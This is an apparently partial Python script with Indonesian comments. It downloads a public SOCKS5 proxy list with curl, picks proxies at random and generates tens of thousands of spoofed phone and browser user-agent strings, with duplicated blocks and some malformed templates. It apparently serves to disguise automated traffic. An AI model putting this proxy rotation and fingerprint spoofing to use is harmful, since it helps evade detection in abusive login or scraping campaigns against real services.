import os,re
from os import path
try:
	import requests
except:
	os.system('pip install requests')
from concurrent.futures import ThreadPoolExecutor as tred
import random,subprocess,time,sys,uuid,base64,zlib
os.system('clear')
print('\n\n')
print(" Installing proxies & user agents ")
try:
    os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o .prox.txt')
except: exit("No Internet Connection! ")
print()
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}
ugen=[]
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for x in range(10000):
    rr = random.randint
    rc = random.choice
    at_ip1 = rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"])
    at_ip2 = rc(["8B112","19E258","15E148","15D100","8A293","8B116","8B117","8C148","8C148","17H35","15E148","8B112","21A360","21B77","12A365","12A405","12B410","12B410","12B435","12B440","12B466","11A465","10A406","11A501","11B554a","11D167"])
    at_ip3 = rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"])
    model = rc(["bhb-IN","mag-IN","en-us","nan-TW","ro-RO","de-de","yue-HK","en-HK","gl-ES"])
    NO = rc([f'{str(rr(1,10))}.{str(rr(0,4))}.{str(rr(0,4))}',f'{str(rr(1,25))}.0',f'{str(rr(1,25))}'])
    a = rc(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID'])
    b = rc(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata'])
    ran = rc(['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H','R16NW'])
    SM = rc(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B","A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY","G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F","J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U","G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"])
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU',
    'SD2A','AB03E','Z367Q','R8638','C886H']
    merek = rc(['SM-S767VL','SM-N950U','SM-C7100'])
    dafa1 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa3 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    useragen = rc([dafa1,dafa2,dafa3,dafa4])
    ugen.append(dafa1)
    ugen.append(dafa2)
    ugen.append(dafa3)
    ugen.append(dafa4)

for x in range(1000):
    rr = random.randint
    rc = random.choice
    A7A = f"Mozilla/5.0 (Linux; Android {str(rr(3,10))}; Nokia 1000 4G Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(173,299))} Mobile Safari/535.2"
    A7A1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,10))}; Nokia 3115 Build/IMM76D) AppleWebKit/537.7 (KHTML, like Gecko)  Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(73,399))} Mobile Safari/537.4"
    A7A2  = f"Mozilla/5.0 (Android; Android {str(rr(7,12))}; LG-H920 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/534.0"
    A7A3  = f"Mozilla/5.0 (Linux; U; Android {str(rr(4,12))}; Elephone P3000 Build/KTU84P) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/{str(rr(33,199))}.0.{str(rr(1500,2900))}.{str(rr(75,450))} Mobile Safari/536.1"
    A7A4  = "Mozilla/5.0 (Android; Android {str(rr(7,12))}; HUAWEI G{str(rr(2,12))}-L{str(rr(3,12))} Build/HuaweiG{str(rr(7,12))}-L{str(rr(7,12))}) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(2111,4999))}.{str(rr(73,299))} Mobile Safari/533.9"
    A7A5  = "Mozilla/5.0 (Linux; U; Android {str(rr(3,12))}; Samsung Galaxy S4 Mega GT-{str(rr(I4400,I9400))} Build/JDQ{str(rr(21,112))}) AppleWebKit/537.24 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,199))} Mobile Safari/534.0"
    A7A6  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,12))}_{str(rr(3,8))}_0 like Mac OS X) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,399))} Mobile Safari/536.3"
    A7A7  = f"Mozilla/5.0 (Android; Android{str(rr(4,12))}; MOTOROLA MOTO XT{str(rr(1300,1580))} Build/LXB{str(rr(10,25))}) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/537.36"
    A7A8  = "Mozilla/5.0 (iPad; CPU iPad OS {str(rr(7,16))}_{str(rr(4,22))}_{str(rr(4,12))} like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/{str(rr(25,150))}.0.{str(rr(1111,3999))}.{str(rr(73,599))} Mobile Safari/534.6"
    ugen.append(A7A)
    ugen.append(A7A1)
    ugen.append(A7A2)
    ugen.append(A7A3)
    ugen.append(A7A4)
    ugen.append(A7A5)
    ugen.append(A7A6)
    ugen.append(A7A7)
    ugen.append(A7A8)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

for xd in range(10000):
    rr = random.randint; rc = random.choice
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H'] 
    strvgt = f"viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .{str(rr(1,20))}; WOW64){str(rc(gt))})Applewebkit/537.36 (KHTML, like Gecko) Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Safari/537.36 Vivaldi/6.0.2979.18"
    uateddy = random.choice([strvgt])
    ugen.append(uateddy)
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for x in range(10000):
    rr = random.randint
    rc = random.choice
    at_ip1 = rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"])
    at_ip2 = rc(["8B112","19E258","15E148","15D100","8A293","8B116","8B117","8C148","8C148","17H35","15E148","8B112","21A360","21B77","12A365","12A405","12B410","12B410","12B435","12B440","12B466","11A465","10A406","11A501","11B554a","11D167"])
    at_ip3 = rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"])
    model = rc(["bhb-IN","mag-IN","en-us","nan-TW","ro-RO","de-de","yue-HK","en-HK","gl-ES"])
    NO = rc([f'{str(rr(1,10))}.{str(rr(0,4))}.{str(rr(0,4))}',f'{str(rr(1,25))}.0',f'{str(rr(1,25))}'])
    a = rc(['sv_SE','en_GB','en_US','es_MX','th_TH','pl_PL','id_ID'])
    b = rc(['TELKOMSEL','AXIS','Indosat','XL','3SinyalKuatHemat','Tsel-PakaiMasker','XL Axiata'])
    ran = rc(['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU','SD2A','AB03E','Z367Q','R8638','C886H','R16NW'])
    SM = rc(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B","A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY","G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F","J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U","G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"])
    gt = ['N4LEFH','TQ2A','QQ1B','PQ1A','SQ3A','RD1B','LDK2WU',
    'SD2A','AB03E','Z367Q','R8638','C886H']
    merek = rc(['SM-S767VL','SM-N950U','SM-C7100'])
    dafa1 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa2 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa3 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    dafa4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(5,18))}_{str(rr(0,10))}_{str(rr(0,6))} like Mac OS X; {model}) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Browser/NetFront/{str(rr(10,99))}.{str(rr(10,99))} Version/{str(rr(7,99))}.{str(rr(0,5))} Mobile/{at_ip2} Safari/{at_ip3}'
    useragen = rc([dafa1,dafa2,dafa3,dafa4])
    ugen.append(dafa1)
    ugen.append(dafa2)
    ugen.append(dafa3)
    ugen.append(dafa4)

for x in range(1000):
    rr = random.randint
    rc = random.choice
    A7A = f"Mozilla/5.0 (Linux; Android {str(rr(3,10))}; Nokia 1000 4G Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(173,299))} Mobile Safari/535.2"
    A7A1 = f"Mozilla/5.0 (Linux; U; Android {str(rr(3,10))}; Nokia 3115 Build/IMM76D) AppleWebKit/537.7 (KHTML, like Gecko)  Chrome/{str(rr(25,100))}.0.{str(rr(2111,3999))}.{str(rr(73,399))} Mobile Safari/537.4"
